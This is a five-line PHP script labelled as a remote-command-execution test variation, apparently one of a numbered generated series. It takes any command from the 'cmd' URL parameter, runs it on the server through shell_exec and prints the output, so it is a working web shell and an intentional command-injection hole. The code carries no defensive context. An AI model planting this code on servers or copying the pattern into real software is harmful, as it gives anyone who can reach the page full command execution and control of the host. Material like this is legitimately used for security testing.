<?php
// RCE test variation #1305
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>